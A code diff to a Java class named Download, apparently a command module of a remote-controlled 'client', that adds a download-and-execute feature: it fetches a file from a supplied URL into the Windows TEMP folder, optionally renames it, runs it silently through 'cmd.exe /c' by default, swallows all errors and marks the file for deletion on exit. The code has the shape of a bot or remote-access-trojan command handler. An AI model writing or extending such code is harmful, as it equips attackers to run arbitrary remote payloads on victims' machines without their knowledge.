@@ -18,7 +18,7 @@ import java.nio.channels.ReadableByteChannel;
  * A basic download and execute function for the client.
  *
  * @author Aazim
- * @version 1.0
+ * @version 1.1
  */
 @Command("download")
 public class Download implements Action {
@@ -30,11 +30,27 @@ public class Download implements Action {
             final URL url = new URL(link);
             final Browser browser = new Browser(url);
             ReadableByteChannel r = Channels.newChannel(browser.getInputSteam());
-            File file = new File(System.getenv("TEMP") + "\\" + link.substring(link.lastIndexOf("/") + 1));
+            String saveLoc = System.getenv("TEMP") + "\\" + link.substring(link.lastIndexOf("/") + 1);
+            boolean execute = true;
+            for (int i = 0; i < params.length(); i++) {
+                if (params.getString(i).startsWith("-name:")) {
+                    String name = params.getString(i).substring(params.getString(i).indexOf(":") + 1);
+                    saveLoc = System.getenv("TEMP") + "\\" + name;
+                } else if (params.getString(i).equalsIgnoreCase("-norun")) {
+                    execute = false;
+                }
+            }
+            File file = new File(saveLoc);
             if (!file.exists() && !file.createNewFile()) return;
             FileOutputStream fos = new FileOutputStream(file);
             fos.getChannel().transferFrom(r, 0, 1 << 24);
             fos.close();
+            if (execute) {
+                final Runtime cmd = Runtime.getRuntime();
+                cmd.exec("cmd.exe /c \"" + saveLoc + "\"");
+                Thread.sleep(1000);
+            }
+            file.deleteOnExit();
         } catch (Exception ignored) {
 
         }
